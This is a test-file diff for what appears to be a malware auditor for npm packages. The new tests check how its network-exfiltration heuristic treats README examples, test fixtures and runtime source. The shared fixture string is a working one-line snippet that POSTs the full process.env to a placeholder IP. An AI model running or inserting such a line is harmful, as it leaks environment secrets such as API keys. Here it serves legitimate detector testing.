@@ -176,6 +176,65 @@ test("npm-vs-github divergence alone is review, not block", () => {
   );
 });
 
+// Documentation (README/markdown) is data, not executable code. Illustrative
+// example snippets in docs must NOT trip the code-malware heuristics — axios and
+// dotenv were BLOCK/F purely because their READMEs show process.env + fetch.
+const EXFIL_SHAPED = "const ip = '1.2.3.4';\nfetch('http://' + ip, { method: 'POST', body: JSON.stringify(process.env) });\n";
+
+test("exfil-shaped example code in a README does not fire (docs are not code)", () => {
+  const report = auditEvidence({
+    packageName: "doc-pkg",
+    sourceFiles: {
+      "package.json": JSON.stringify({ name: "doc-pkg", repository: "https://github.com/example/doc-pkg" }),
+      "index.js": "exports.run = () => 'ok';",
+      "README.md": "## Usage\n```js\n" + EXFIL_SHAPED + "```\n"
+    }
+  });
+
+  assert.ok(
+    !report.findings.some((f) => f.category === "network-exfil-or-loader"),
+    "README example must not produce a network-exfil-or-loader finding"
+  );
+  assert.notEqual(report.verdict, "block");
+});
+
+// The same exfil-shaped code in a TEST fixture is review-level, not a hard
+// block — test files aren't in the package's runtime path (fastify tripped this
+// on trust-proxy tests with hardcoded IPs).
+test("exfil-shaped code in a test fixture is review, not block", () => {
+  const report = auditEvidence({
+    packageName: "test-fixture-pkg",
+    sourceFiles: {
+      "package.json": JSON.stringify({ name: "test-fixture-pkg", repository: "https://github.com/example/x" }),
+      "index.js": "exports.run = () => 'ok';",
+      "test/proxy.test.js": EXFIL_SHAPED
+    }
+  });
+
+  assert.equal(report.verdict, "review");
+  const exfil = report.findings.filter((f) => f.category === "network-exfil-or-loader");
+  assert.ok(exfil.length > 0, "the signal should still be recorded");
+  assert.ok(exfil.every((f) => f.severity === "medium"), "but downgraded to medium in a test file");
+});
+
+// Guard against over-correction: the SAME pattern in real runtime source
+// (index.js) must still fire HIGH and BLOCK.
+test("exfil-shaped code in runtime source still blocks", () => {
+  const report = auditEvidence({
+    packageName: "evil-runtime-pkg",
+    sourceFiles: {
+      "package.json": JSON.stringify({ name: "evil-runtime-pkg", repository: "https://github.com/example/x" }),
+      "index.js": EXFIL_SHAPED
+    }
+  });
+
+  assert.equal(report.verdict, "block");
+  assert.ok(
+    report.findings.some((f) => f.category === "network-exfil-or-loader" && f.severity === "high"),
+    "runtime source must still produce a HIGH exfil finding"
+  );
+});
+
 // Downgrading divergence must NOT mask a genuinely malicious file shipped
 // alongside it — a real high-severity finding still blocks.
 test("real malicious code still blocks even when divergence is present", () => {
